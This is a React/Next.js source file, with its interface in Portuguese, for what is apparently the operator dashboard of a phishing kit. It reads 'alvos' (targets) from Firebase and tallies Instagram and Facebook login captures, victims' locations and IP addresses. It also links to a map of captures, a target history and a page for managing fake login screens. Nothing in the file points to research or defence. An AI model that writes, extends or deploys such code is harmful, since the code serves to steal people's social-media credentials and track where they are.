"use client"

import { useState, useEffect } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Target, Instagram, Facebook, MapPin, TrendingUp, Activity, Clock } from "lucide-react"
import Link from "next/link"
import { ref, onValue, off } from "firebase/database"
import { database } from "@/lib/firebase"
import { getCurrentUserId } from "@/lib/user-context"

interface CapturedData {
  id: string
  pageName: string
  pageType: string
  data: Record<string, any>
  timestamp: number
  ipAddress?: string
}

export default function DashboardPage() {
  const [captures, setCaptures] = useState<CapturedData[]>([])
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    const userId = getCurrentUserId()

    if (!userId) {
      console.log("[v0] No user logged in")
      setLoading(false)
      return
    }

    const capturesRef = ref(database, `alvos/${userId}`)

    const handleData = (snapshot: any) => {
      if (snapshot.exists()) {
        const data = snapshot.val()
        const capturesArray: CapturedData[] = Object.entries(data).map(([id, value]: [string, any]) => ({
          id,
          pageName: value.pageName || value.page || "Captura Desconhecida",
          pageType: (value.pageType || value.page || value.type || "unknown").toLowerCase(),
          data: value.data || {},
          timestamp: value.timestamp ? new Date(value.timestamp).getTime() : Date.now(),
          ipAddress: value.ipAddress,
        }))
        setCaptures(capturesArray.sort((a, b) => b.timestamp - a.timestamp))
      } else {
        setCaptures([])
      }
      setLoading(false)
    }

    onValue(capturesRef, handleData)
    return () => off(capturesRef, "value", handleData)
  }, [])

  const totalCaptures = captures.length
  const instagramCaptures = captures.filter((c) => c.pageType === "instagram").length
  const facebookCaptures = captures.filter((c) => c.pageType === "facebook").length
  const locationCaptures = captures.filter((c) => c.pageType === "location").length

  const last24h = captures.filter((c) => Date.now() - c.timestamp < 86400000).length
  const lastHour = captures.filter((c) => Date.now() - c.timestamp < 3600000).length

  const recentActivities = captures.slice(0, 5)

  const getRelativeTime = (date: Date) => {
    const diffInMs = Date.now() - date.getTime()
    const diffInMinutes = Math.floor(diffInMs / 60000)
    const diffInHours = Math.floor(diffInMs / 3600000)

    if (diffInMinutes < 1) return "Agora"
    if (diffInMinutes < 60) return `${diffInMinutes}m atrás`
    if (diffInHours < 24) return `${diffInHours}h atrás`
    return `${Math.floor(diffInHours / 24)}d atrás`
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-[400px]">
        <div className="text-center space-y-3">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto" />
          <p className="text-muted-foreground">Carregando...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="space-y-6">
      <div className="space-y-1">
        <h1 className="text-2xl font-bold text-foreground">Dashboard</h1>
        <p className="text-sm text-muted-foreground">Monitoramento em tempo real</p>
      </div>

      <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
        <Card className="border-border/50 bg-card/50 backdrop-blur">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Total</CardTitle>
            <Target className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-foreground">{totalCaptures}</div>
            <p className="text-xs text-muted-foreground mt-1">{last24h} nas últimas 24h</p>
          </CardContent>
        </Card>

        <Card className="border-border/50 bg-card/50 backdrop-blur">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Instagram</CardTitle>
            <Instagram className="h-4 w-4 text-pink-500" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-foreground">{instagramCaptures}</div>
            <p className="text-xs text-muted-foreground mt-1">Capturas de login</p>
          </CardContent>
        </Card>

        <Card className="border-border/50 bg-card/50 backdrop-blur">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Facebook</CardTitle>
            <Facebook className="h-4 w-4 text-blue-500" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-foreground">{facebookCaptures}</div>
            <p className="text-xs text-muted-foreground mt-1">Capturas de login</p>
          </CardContent>
        </Card>

        <Card className="border-border/50 bg-card/50 backdrop-blur">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Última Hora</CardTitle>
            <Activity className="h-4 w-4 text-green-500" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-foreground">{lastHour}</div>
            <p className="text-xs text-muted-foreground mt-1">Capturas recentes</p>
          </CardContent>
        </Card>
      </div>

      <div className="grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
        <Link href="/dashboard/map" className="group">
          <Card className="border-border/50 bg-gradient-to-br from-primary/10 to-primary/5 hover:from-primary/20 hover:to-primary/10 transition-all cursor-pointer">
            <CardContent className="flex items-center gap-4 p-4">
              <div className="p-3 rounded-lg bg-primary/20 group-hover:bg-primary/30 transition-colors">
                <MapPin className="h-6 w-6 text-primary" />
              </div>
              <div className="flex-1">
                <p className="font-semibold text-foreground">Mapa Global</p>
                <p className="text-xs text-muted-foreground">Visualizar capturas</p>
              </div>
            </CardContent>
          </Card>
        </Link>

        <Link href="/dashboard/alvos" className="group">
          <Card className="border-border/50 bg-card/50 hover:bg-card transition-all cursor-pointer">
            <CardContent className="flex items-center gap-4 p-4">
              <div className="p-3 rounded-lg bg-muted group-hover:bg-muted/80 transition-colors">
                <Target className="h-6 w-6 text-foreground" />
              </div>
              <div className="flex-1">
                <p className="font-semibold text-foreground">Capturas</p>
                <p className="text-xs text-muted-foreground">Ver histórico</p>
              </div>
            </CardContent>
          </Card>
        </Link>

        <Link href="/dashboard/pages" className="group">
          <Card className="border-border/50 bg-card/50 hover:bg-card transition-all cursor-pointer">
            <CardContent className="flex items-center gap-4 p-4">
              <div className="p-3 rounded-lg bg-muted group-hover:bg-muted/80 transition-colors">
                <TrendingUp className="h-6 w-6 text-foreground" />
              </div>
              <div className="flex-1">
                <p className="font-semibold text-foreground">Telas</p>
                <p className="text-xs text-muted-foreground">Gerenciar páginas</p>
              </div>
            </CardContent>
          </Card>
        </Link>
      </div>

      <Card className="border-border/50 bg-card/50 backdrop-blur">
        <CardHeader>
          <div className="flex items-center justify-between">
            <CardTitle className="text-base font-semibold flex items-center gap-2">
              <Clock className="h-4 w-4 text-primary" />
              Atividade Recente
            </CardTitle>
            <Link href="/dashboard/alvos">
              <Button variant="ghost" size="sm" className="text-xs">
                Ver todas
              </Button>
            </Link>
          </div>
        </CardHeader>
        <CardContent>
          {recentActivities.length === 0 ? (
            <div className="text-center py-8 text-muted-foreground text-sm">Nenhuma captura ainda</div>
          ) : (
            <div className="space-y-3">
              {recentActivities.map((activity) => (
                <div
                  key={activity.id}
                  className="flex items-center gap-3 p-3 rounded-lg bg-muted/30 hover:bg-muted/50 transition-colors"
                >
                  <div className="p-2 rounded-lg bg-primary/10">
                    {activity.pageType === "instagram" && <Instagram className="h-4 w-4 text-pink-500" />}
                    {activity.pageType === "facebook" && <Facebook className="h-4 w-4 text-blue-500" />}
                    {activity.pageType === "location" && <MapPin className="h-4 w-4 text-green-500" />}
                    {!["instagram", "facebook", "location"].includes(activity.pageType) && (
                      <Target className="h-4 w-4 text-primary" />
                    )}
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-medium text-foreground truncate">{activity.pageName}</p>
                    <p className="text-xs text-muted-foreground capitalize">{activity.pageType}</p>
                  </div>
                  <span className="text-xs text-muted-foreground whitespace-nowrap">
                    {getRelativeTime(new Date(activity.timestamp))}
                  </span>
                </div>
              ))}
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  )
}
